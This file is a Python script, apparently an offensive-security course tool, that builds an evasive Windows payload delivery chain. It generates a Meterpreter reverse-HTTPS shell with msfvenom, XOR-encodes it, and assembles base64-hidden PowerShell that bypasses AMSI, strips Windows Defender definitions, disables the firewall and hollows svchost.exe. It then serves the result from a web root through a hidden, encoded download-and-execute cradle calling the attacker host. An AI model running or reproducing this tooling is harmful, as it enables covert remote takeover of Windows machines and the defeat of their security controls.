import os
from base64 import b64encode,b64decode

lhost = "192.168.49.79" #"192.168.135.7" #"10.14.14.21"
lport = "443"
bitness = "64" #"32" #"64"
stage_encoding = "0" #"0" #"1"

custom_agent = "1" #"0" #"1" #will make cradle pretty long - makes defender suspicious
#agent_string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Edg/94.0.992.38"
agent_string = "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"

proxy_kill = "0" #"0" #"1" #cannot coexist with proxy_steal, leave "0" by default since normal user will already use proxy
proxy_steal = "0" #"0" #"1" #only use when in SYSTEM powershell shell

# proxy-safe - if both "1", choose proxy_kill
if proxy_kill == "1" and proxy_steal == "1":
    proxy_steal = "0"
if proxy_kill == "1":
    proxy_steal = "0"
if proxy_steal == "1":
    proxy_kill = "0"

runnerwebroot = "/var/www/html/"
runnerfilename = "run.txt" #run.txt

def copy(runfilename,payfilepath,payfilename):
    os.system("cp %s %s%s" % (runfilename,payfilepath,payfilename))
    print ('[+] %s copied to %s%s' % (runfilename,payfilepath,payfilename))
    pass

def powershell_b64encode(cmd):
    cmd = cmd.encode('UTF-16LE')
    res = b64encode(cmd).decode()
    return res
    pass

def cradleps1(lhost,runnerfilename):
    cradle = "$wc = (new-object system.net.webclient);"
    if proxy_kill == "1":
        cradle += "$wc.proxy = $null;"
    if custom_agent == "1":
        cradle += "$wc.headers.add('User-Agent','%s');" % agent_string
    if proxy_steal == "1":
        cradle += "New-PSDrive -NAME HKU -PSProvider Registry -Root HKEY_USERS | Out-Null;$keys = gci \'HKU:\\\';ForEach ($key in $keys) {if ($key.Name -like \"*S-1-5-21-*\") {$start = $key.Name.substring(10);break}};$proxyAddr = (Get-ItemProperty -Path \"HKU:$start\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\\").ProxyServer;"
        cradle += "[system.net.webrequest]::DefaultWebProxy = new-object system.net.webproxy(\"http://$proxyAddr\");" #note: assuming proxy over http, not https
    cradle += "iex($wc.downloadstring('%s'))"
    target = "http://%s/%s" % (lhost,runnerfilename)
    target = cradle % target
    print ('[+] cradle: %s' % target)
    fullcradle = "powershell -Win hidden -nonI -noP -Exe ByPass -ENC %s" % powershell_b64encode(target)
    print ('[+] cradle target: http://%s/%s -> use:\n%s' % (lhost,runnerfilename,fullcradle))
    return fullcradle,cradle

def gen(lhost,lport,bitness,pformat):
    msf_payload = "windows/x64/meterpreter/reverse_https"
    if bitness == "32":
        msf_payload = "windows/meterpreter/reverse_https"
    cmd = "msfvenom -p "+msf_payload+" LHOST="+lhost+" LPORT="+lport+" EXITFUNC=thread -f "+pformat+" -o met"+bitness+"."+pformat+""
    os.system(cmd)
    #print (cmd)
    print ('[+] met generated: lhost %s, lport %s, bitness %s, format %s' % (lhost,lport,bitness,pformat))
    print ('[!] msfvenom: %s' % cmd)
    resourcefile(msf_payload,lhost,lport,bitness)
    pass

def resourcefile(msf_payload,lhost,lport,bitness):
    rcfilename = "basic.rc"
    with open(rcfilename,'w') as f:
        f.write("use exploit/multi/handler" + "\n")
        f.write("set payload %s\n" % msf_payload)
        f.write("set lhost %s\n" % lhost)
        f.write("set lport %s\n" % lport)
        if stage_encoding == "1":
            f.write("set EnableStageEncoding true\n")
            if bitness == "64": 
                f.write("set StageEncoder x64/zutto_dekiru\n") # only if x64
                print('[!] warning: "StageEncoder x64/zutto_dekiru" in use')
        f.write("run\n")
    f.close()
    print ('[+] msf resource script written: %s -> use:\nsudo msfconsole -r %s [or] resource %s' % (rcfilename,rcfilename,rcfilename))
    pass

def bxor(b1, b2):
    res = bytes([_a ^ _b for _a, _b in zip(b1, b2)])
    res = "{:02x}".format(ord(res))
    res = "0x" + res
    return res

def xor_buffer_ps1(lhost,lport,bitness):
    pformat = "ps1"
    gen(lhost,lport,bitness,pformat) #WATCH!
    msffilename = "met%s.%s" % (bitness,pformat)
    
    m = open(msffilename,'r')
    msf = m.read()
    mheader = msf[:16]
    mpayload = msf[16:]
    mbytes = mpayload.split(',')
    '''
    $encoded = [byte[]]::new($buf.Length)
    for($i=0; $i -lt $buf.Length ; $i++)
    {
        $encoded[$i] = $buf[$i] -bxor 0xfa
    }

    $hex = [System.Text.StringBuilder]::new($encoded.Length * 2)
    $totalCount = $encoded.Length

    for($count=0; $count -lt $totalCount ; $count++) 
    {
        if (($count + 1) -eq $totalCount)
        {
            $hex.AppendFormat("0x{0:x2}", $encoded[$count]) | Out-Null
        }
        else
        {
            $hex.AppendFormat("0x{0:x2}, ", $encoded[$count]) | Out-Null
        }

        if (($count + 1) % 15 -eq 0)
        {
            $hex.Append("`n") | Out-Null
        }
    }
    '''
    mres = []
    xorkey = bytes.fromhex("fa")
    for byte in mbytes:
        #print (byte)
        tmp = byte[2:]
        #print (tmp)
        if len(tmp) == 1:
            tmp = "0" + tmp
        #print (tmp)
        tmp = bytes.fromhex(tmp)
        res = bxor(tmp,xorkey)
        #print(res)
        res = res#.decode('iso8859-1') #.encode('ASCII') #'latin1'
        mres.append(res)
    msfres = ", ".join(mres)
    msfres = mheader + msfres
    #print (msfres)
    return msfres
    pass

def runner(lhost,lport,bitness):
    amsi_breakerps1 = "JGE9W1JlZl0uQXNzZW1ibHkuR2V0VHlwZXMoKTtGb3JFYWNoKCRiIGluICRhKSB7aWYgKCRiLk5hbWUgLWxpa2UgJyppVXRpbHMnKSB7JGM9JGJ9fTskZD0kYy5HZXRGaWVsZHMoJ05vblB1YmxpYyxTdGF0aWMnKTtGb3JFYWNoKCRlIGluICRkKSB7aWYgKCRlLk5hbWUgLWxpa2UgJypDb250ZXh0JykgeyRmPSRlfX07JGc9JGYuR2V0VmFsdWUoJG51bGwpO1tJbnRQdHJdJHB0cj0kZztbSW50MzJbXV0kYnVmPUAoMCk7W1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkYnVmLCAwLCAkcHRyLCAxKQ=="
    loop_defender = "c3RhcnQtcHJvY2VzcyBwb3dlcnNoZWxsLmV4ZSAtYXJndW1lbnRsaXN0ICJ3aGlsZSgxKXsmICdDOlxQcm9ncmFtIEZpbGVzXFdpbmRvd3MgRGVmZW5kZXJcTXBDbWRSdW4uZXhlJyAtUmVtb3ZlRGVmaW5pdGlvbnMgLUFsbDtzdGFydC1zbGVlcCAtc2Vjb25kcyAzMDB9IiAtd2luZG93c3R5bGUgaGlkZGVuCg=="
    disable_defender = "JiAnQzpcUHJvZ3JhbSBGaWxlc1xXaW5kb3dzIERlZmVuZGVyXE1wQ21kUnVuLmV4ZScgLVJlbW92ZURlZmluaXRpb25zIC1BbGw="
    funcs = "ZnVuY3Rpb24gTG9va3VwRnVuYygpewogICAgUGFyYW0gKCRtb2R1bGVOYW1lLCAkbWV0aG9kTmFtZSkKICAgICRhc3NlbSA9IChbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbi5HZXRBc3NlbWJsaWVzKCkgfCBXaGVyZS1PYmplY3QgeyAkXy5HbG9iYWxBc3NlbWJseUNhY2hlIC1BbmQgJF8uTG9jYXRpb24uU3BsaXQoJ1xcJylbLTFdLkVxdWFscygnU3lzdGVtLmRsbCcpfSkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQogICAgJHRtcCA9IEAoKQogICAgJGFzc2VtLkdldE1ldGhvZHMoKSB8IEZvckVhY2gtT2JqZWN0IHtJZigkXy5OYW1lIC1lcSAiR2V0TW9kdWxlSGFuZGxlIikgeyR0bXAgKz0kX319CiAgICAkR2V0TW9kdWxlSGFuZGxlID0gJHRtcFswXQogICAgJHVzZXIzMiA9ICRHZXRNb2R1bGVIYW5kbGUuSW52b2tlKCRudWxsLCAkbW9kdWxlTmFtZSkKICAgICR0bXAgPSBAKCkKICAgICRhc3NlbS5HZXRNZXRob2RzKCkgfCBGb3JFYWNoLU9iamVjdCB7SWYoJF8uTmFtZSAtZXEgIkdldFByb2NBZGRyZXNzIikgeyR0bXAgKz0kX319CiAgICAkR2V0UHJvY0FkZHJlc3MgPSAkdG1wWzBdCiAgICAkcGFyYW1zID0gQChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZl0oTmV3LU9iamVjdCBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuSGFuZGxlUmVmKChOZXctT2JqZWN0IEludFB0ciksICR1c2VyMzIpKSwgJG1ldGhvZE5hbWUpCiAgICB0cnkgewogICAgICAgIHJldHVybiAkR2V0UHJvY0FkZHJlc3MuSW52b2tlKCRudWxsLCRwYXJhbXMpCiAgICB9IGNhdGNoIHsKICAgICAgICByZXR1cm4gJEdldFByb2NBZGRyZXNzLkludm9rZSgkbnVsbCxAKCR1c2VyMzIsICRtZXRob2ROYW1lKSkKICAgIH0KfQoKZnVuY3Rpb24gZ2V0RGVsZWdhdGVUeXBlIHsKICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbVHlwZVtdXSAkZnVuYywKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSldIFtUeXBlXSAkZGVsVHlwZSA9IFtWb2lkXQogICAgKQogICAgJHR5cGUgPSBbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbi5EZWZpbmVEeW5hbWljQXNzZW1ibHkoKE5ldy1PYmplY3QgU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHlOYW1lKCdSZWZsZWN0ZWREZWxlZ2F0ZScpKSwgW1N5c3RlbS5SZWZsZWN0aW9uLkVtaXQuQXNzZW1ibHlCdWlsZGVyQWNjZXNzXTo6UnVuKS5EZWZpbmVEeW5hbWljTW9kdWxlKCdJbk1lbW9yeU1vZHVsZScsICRmYWxzZSkuRGVmaW5lVHlwZSgnTXlEZWxlZ2F0ZVR5cGUnLCAnQ2xhc3MsIFB1YmxpYywgU2VhbGVkLCBBbnNpQ2xhc3MsIEF1dG9DbGFzcycsIFtTeXN0ZW0uTXVsdGljYXN0RGVsZWdhdGVdKQogICAgJHR5cGUuRGVmaW5lQ29uc3RydWN0b3IoJ1JUU3BlY2lhbE5hbWUsIEhpZGVCeVNpZywgUHVibGljJywgW1N5c3RlbS5SZWZsZWN0aW9uLkNhbGxpbmdDb252ZW50aW9uc106OlN0YW5kYXJkLCAkZnVuYykuU2V0SW1wbGVtZW50YXRpb25GbGFncygnUnVudGltZSwgTWFuYWdlZCcpCiAgICAkdHlwZS5EZWZpbmVNZXRob2QoJ0ludm9rZScsICdQdWJsaWMsIEhpZGVCeVNpZywgTmV3U2xvdCwgVmlydHVhbCcsICRkZWxUeXBlLCAkZnVuYykuU2V0SW1wbGVtZW50YXRpb25GbGFncygnUnVudGltZSwgTWFuYWdlZCcpCiAgICByZXR1cm4gJHR5cGUuQ3JlYXRlVHlwZSgpCn0K"
    types = "QWRkLVR5cGUgLVR5cGVEZWZpbml0aW9uIEAiCnVzaW5nIFN5c3RlbTsKdXNpbmcgU3lzdGVtLkRpYWdub3N0aWNzOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CgpbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCnB1YmxpYyBzdHJ1Y3QgUFJPQ0VTU19JTkZPUk1BVElPTgp7CiAgICBwdWJsaWMgSW50UHRyIGhQcm9jZXNzOyBwdWJsaWMgSW50UHRyIGhUaHJlYWQ7IHB1YmxpYyB1aW50IGR3UHJvY2Vzc0lkOyBwdWJsaWMgdWludCBkd1RocmVhZElkOwp9CgpbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCnB1YmxpYyBzdHJ1Y3QgUFJPQ0VTU19CQVNJQ19JTkZPUk1BVElPTgp7CiAgICBwdWJsaWMgSW50UHRyIEV4aXRTdGF0dXM7IHB1YmxpYyBJbnRQdHIgUGViQmFzZUFkZHJlc3M7IHB1YmxpYyBJbnRQdHIgQWZmaW5pdHlNYXNrOyBwdWJsaWMgSW50UHRyIEJhc2VQcmlvcml0eTsgcHVibGljIFVJbnRQdHIgVW5pcXVlUHJvY2Vzc0lkOyBwdWJsaWMgSW50UHRyIEluaGVyaXRlZEZyb21VbmlxdWVQcm9jZXNzSWQ7Cn0KCltTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsLCBDaGFyU2V0ID0gQ2hhclNldC5Vbmljb2RlKV0KcHVibGljIHN0cnVjdCBTVEFSVFVQSU5GTwp7CiAgICBwdWJsaWMgdWludCBjYjsgcHVibGljIHN0cmluZyBscFJlc2VydmVkOyBwdWJsaWMgc3RyaW5nIGxwRGVza3RvcDsgcHVibGljIHN0cmluZyBscFRpdGxlOwogICAgcHVibGljIHVpbnQgZHdYOyBwdWJsaWMgdWludCBkd1k7IHB1YmxpYyB1aW50IGR3WFNpemU7IHB1YmxpYyB1aW50IGR3WVNpemU7IHB1YmxpYyB1aW50IGR3WENvdW50Q2hhcnM7CiAgICBwdWJsaWMgdWludCBkd1lDb3VudENoYXJzOyBwdWJsaWMgdWludCBkd0ZpbGxBdHRyaWJ1dGU7IHB1YmxpYyB1aW50IGR3RmxhZ3M7IHB1YmxpYyBzaG9ydCB3U2hvd1dpbmRvdzsKICAgIHB1YmxpYyBzaG9ydCBjYlJlc2VydmVkMjsgcHVibGljIEludFB0ciBscFJlc2VydmVkMjsgcHVibGljIEludFB0ciBoU3RkSW5wdXQ7IHB1YmxpYyBJbnRQdHIgaFN0ZE91dHB1dDsKICAgIHB1YmxpYyBJbnRQdHIgaFN0ZEVycm9yOwp9CgpbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCnB1YmxpYyBzdHJ1Y3QgU0VDVVJJVFlfQVRUUklCVVRFUwp7CiAgICBwdWJsaWMgaW50IGxlbmd0aDsgcHVibGljIEludFB0ciBscFNlY3VyaXR5RGVzY3JpcHRvcjsgcHVibGljIGJvb2wgYkluaGVyaXRIYW5kbGU7Cn0KCnB1YmxpYyBzdGF0aWMgY2xhc3MgSG9sbG93CnsKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvcj10cnVlKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgQ3JlYXRlUHJvY2VzcygKICAgICAgICBzdHJpbmcgbHBBcHBsaWNhdGlvbk5hbWUsIHN0cmluZyBscENvbW1hbmRMaW5lLCByZWYgU0VDVVJJVFlfQVRUUklCVVRFUyBscFByb2Nlc3NBdHRyaWJ1dGVzLCAKICAgICAgICByZWYgU0VDVVJJVFlfQVRUUklCVVRFUyBscFRocmVhZEF0dHJpYnV0ZXMsIGJvb2wgYkluaGVyaXRIYW5kbGVzLCB1aW50IGR3Q3JlYXRpb25GbGFncywgCiAgICAgICAgSW50UHRyIGxwRW52aXJvbm1lbnQsIHN0cmluZyBscEN1cnJlbnREaXJlY3RvcnksIHJlZiBTVEFSVFVQSU5GTyBscFN0YXJ0dXBJbmZvLCAKICAgICAgICBvdXQgUFJPQ0VTU19JTkZPUk1BVElPTiBscFByb2Nlc3NJbmZvcm1hdGlvbik7Cn0KIkAK"
    amsi_wrecker = "JG5hbWUxID0gImEiICsgIm1zaSIgKyAiLmRsbCIKJG5hbWUyID0gIkEiICsgIm1zaSIgKyAiT3BlblMiICsgImVzc2lvbiIKW0ludFB0cl0kZnVuY0FkZHIgPSBMb29rdXBGdW5jICRuYW1lMSAkbmFtZTIKCiRvbGRQcm90ZWN0aW9uQnVmZmVyID0gMAokdnA9W1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoKExvb2t1cEZ1bmMga2VybmVsMzIuZGxsIFZpcnR1YWxQcm90ZWN0KSwgKGdldERlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSxbVUludDMyXSwgW1VJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpKSAoW0Jvb2xdKSkpCiR2cC5JbnZva2UoJGZ1bmNBZGRyLCAzLCAweDQwLCBbcmVmXSRvbGRQcm90ZWN0aW9uQnVmZmVyKSB8IE91dC1OdWxsCiRidWYgPSBbQnl0ZVtdXSAoMHg0OCwgMHgzMSwgMHhDMCkKW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkYnVmLCAwLCAkZnVuY0FkZHIsIDMpCiR2cC5JbnZva2UoJGZ1bmNBZGRyLCAzLCAweDIwLCBbcmVmXSRvbGRQcm90ZWN0aW9uQnVmZmVyKSB8IE91dC1OdWxsCg=="
    create_svchost = "JFN0YXJ0dXBJbmZvID0gTmV3LU9iamVjdCBTVEFSVFVQSU5GTwokU3RhcnR1cEluZm8uZHdGbGFncyA9IDB4MSAjIFN0YXJ0dXBJbmZvLmR3RmxhZwokU3RhcnR1cEluZm8ud1Nob3dXaW5kb3cgPSAweDAgIyBTdGFydHVwSW5mby5TaG93V2luZG93CiRTdGFydHVwSW5mby5jYiA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZigkU3RhcnR1cEluZm8pCiRQcm9jZXNzSW5mbyA9IE5ldy1PYmplY3QgUFJPQ0VTU19JTkZPUk1BVElPTgokU2VjQXR0ciA9IE5ldy1PYmplY3QgU0VDVVJJVFlfQVRUUklCVVRFUwokU2VjQXR0ci5MZW5ndGggPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoJFNlY0F0dHIpCiRHZXRDdXJyZW50UGF0aCA9IChHZXQtSXRlbSAtUGF0aCAiLlwiIC1WZXJib3NlKS5GdWxsTmFtZQokcmVzID0gW0hvbGxvd106OkNyZWF0ZVByb2Nlc3MoIkM6XFdpbmRvd3NcU3lzdGVtMzJcc3ZjaG9zdC5leGUiLCAkQXJncywgW3JlZl0gJFNlY0F0dHIsIFtyZWZdICRTZWNBdHRyLCAkZmFsc2UsIDB4MDQsIFtJbnRQdHJdOjpaZXJvLCAkR2V0Q3VycmVudFBhdGgsIFtyZWZdICRTdGFydHVwSW5mbywgW3JlZl0gJFByb2Nlc3NJbmZvKSB8b3V0LW51bGwK"
    locate_offsets = "JFBST0NFU1NfQkFTSUNfSU5GT1JNQVRJT04gPSBOZXctT2JqZWN0IFBST0NFU1NfQkFTSUNfSU5GT1JNQVRJT04KJFBST0NFU1NfQkFTSUNfSU5GT1JNQVRJT05fU2l6ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZigkUFJPQ0VTU19CQVNJQ19JTkZPUk1BVElPTikKW1VJbnQzMl0kdG1wID0gMApbSW50UHRyXSRoUHJvY2VzcyA9ICRQcm9jZXNzSW5mby5oUHJvY2VzczsKJENhbGxSZXN1bHQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigoTG9va3VwRnVuYyBudGRsbC5kbGwgWndRdWVyeUluZm9ybWF0aW9uUHJvY2VzcyksIChnZXREZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludDMyXSwgW1BST0NFU1NfQkFTSUNfSU5GT1JNQVRJT05dLk1ha2VCeVJlZlR5cGUoKSwgW1VJbnQzMl0sIFtVSW50MzJdLk1ha2VCeVJlZlR5cGUoKSkgKFtVSW50MzJdKSkpLkludm9rZSgkaFByb2Nlc3MsMCxbcmVmXSRQUk9DRVNTX0JBU0lDX0lORk9STUFUSU9OLCRQUk9DRVNTX0JBU0lDX0lORk9STUFUSU9OX1NpemUsIFtyZWZdJHRtcCkKW0ludFB0cl0kckltZ0Jhc2VPZmZzZXQgPSAkUFJPQ0VTU19CQVNJQ19JTkZPUk1BVElPTi5QZWJCYXNlQWRkcmVzcy5Ub0ludDY0KCkgKyAweDEwCg=="
    parse_peheader = "JFJlYWRTaXplID0gOAokQnl0ZXNSZWFkID0gMApbSW50UHRyXSRscEJ1ZmZlciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkUmVhZFNpemUpCgokcmVzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoKExvb2t1cEZ1bmMga2VybmVsMzIuZGxsIFJlYWRQcm9jZXNzTWVtb3J5KSwgKGdldERlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pKSkuSW52b2tlKCRoUHJvY2VzcywkckltZ0Jhc2VPZmZzZXQsJGxwQnVmZmVyLCRSZWFkU2l6ZSxbcmVmXSRCeXRlc1JlYWQpCiRTcG9uc29ySW1hZ2VCYXNlID0gKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlJlYWRJbnQ2NCgkKCRscEJ1ZmZlci5Ub0ludDY0KCkpKSkKCiRlcFNpemUgPSAzMDAKW0ludFB0cl0kZXBCdWZmZXIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJGVwU2l6ZSkKJGVwUmVzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoKExvb2t1cEZ1bmMga2VybmVsMzIuZGxsIFJlYWRQcm9jZXNzTWVtb3J5KSwgKGdldERlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pKSkuSW52b2tlKCRoUHJvY2VzcywkU3BvbnNvckltYWdlQmFzZSwkZXBCdWZmZXIsJGVwU2l6ZSxbcmVmXSRCeXRlc1JlYWQpCg=="
    locate_entrypoint = "JGJWYWx1ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlJlYWRJbnQzMigkKCRlcEJ1ZmZlci5Ub0ludDY0KCkpKQokZV9sZmFuZXcgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpSZWFkSW50MzIoJCgkZXBCdWZmZXIuVG9JbnQ2NCgpICsgMHgzQykpCiRvcHRoZHIgPSAkZV9sZmFuZXcgKyAweDI4CgokcnZhID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UmVhZEludDMyKCQoJGVwQnVmZmVyLlRvSW50NjQoKSArICRvcHRoZHIpKQokZXBBZGRyID0gW0ludFB0cl0oJFNwb25zb3JJbWFnZUJhc2UgKyAkcnZhKQ=="
    kill_fw = "bmV0c2ggYWR2ZmlyZXdhbGwgc2V0IGFsbHByb2ZpbGVzIHN0YXRlIG9mZg=="

    #x'ored 0xfa
    msf_buffer = xor_buffer_ps1(lhost,lport,bitness)

    decode_xor = "Zm9yKCRpPTA7ICRpIC1sdCAkYnVmLkxlbmd0aCA7ICRpKyspCnsKICAgICRidWZbJGldID0gJGJ1ZlskaV0gLWJ4b3IgMHhmYQp9Cg=="
    writeprocessmemory = "W1VJbnQzMl0kQnl0ZXNXcml0dGVuID0gMAokQ2FsbFJlc3VsdCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKChMb29rdXBGdW5jIGtlcm5lbDMyLmRsbCBXcml0ZVByb2Nlc3NNZW1vcnkpLCAoZ2V0RGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdLCBbYnl0ZVtdXSwgW0ludDMyXSwgW1VJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkpKS5JbnZva2UoJGhQcm9jZXNzLCRlcEFkZHIsJGJ1ZiwkYnVmLkxlbmd0aCxbcmVmXSRCeXRlc1dyaXR0ZW4pCg=="
    resumethread = "W0ludFB0cl0kaFRocmVhZCA9ICRQcm9jZXNzSW5mby5oVGhyZWFkOwpbVUludDMyXSRSZXNSZXN1bHQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigoTG9va3VwRnVuYyBrZXJuZWwzMi5kbGwgUmVzdW1lVGhyZWFkKSwgKGdldERlbGVnYXRlVHlwZSBAKFtJbnRQdHJdKSAoW1VJbnQzMl0pKSkuSW52b2tlKCRoVGhyZWFkKQo="

    runnerpath = runnerwebroot + runnerfilename
    with open(runnerfilename,'w') as f:
        f.write(b64decode(amsi_breakerps1).decode() + "\n\n")
        f.write(b64decode(loop_defender).decode() + "\n")
        f.write(b64decode(disable_defender).decode() + "\n\n") # only works if admin priv but won't stop script from running
        f.write(b64decode(kill_fw).decode() + "\n\n") # only works if admin priv but won't stop script from running
        f.write(b64decode(funcs).decode() + "\n")
        f.write(b64decode(types).decode() + "\n")
        f.write(b64decode(amsi_wrecker).decode() + "\n")
        f.write(b64decode(create_svchost).decode() + "\n")
        f.write(b64decode(locate_offsets).decode() + "\n")
        f.write(b64decode(parse_peheader).decode() + "\n")
        f.write(b64decode(locate_entrypoint).decode() + "\n\n")
        f.write(msf_buffer + "\n\n")
        f.write(b64decode(decode_xor).decode() + "\n")
        f.write(b64decode(writeprocessmemory).decode() + "\n")
        f.write(b64decode(resumethread).decode() + "\n")
    f.close()
    print ('[+] runner written: %s' % runnerfilename)
    copy(runnerfilename,runnerwebroot,runnerfilename)
    return runnerfilename
    pass

def makeoneliner(runnerfilename): #only seems to work with runspace when payload is large (e.g. run.txt)
    f = open(runnerfilename,'r')
    run = f.read()
    f.close()
    liner = powershell_b64encode(run)
    linercradle = "powershell -enc %s" % liner
    #print(linercradle)
    return linercradle,liner
    pass

if __name__ == "__main__":
    #xor_buffer()
    runner(lhost,lport,bitness)
    cradleps1(lhost,runnerfilename)
    #makeoneliner(runnerfilename)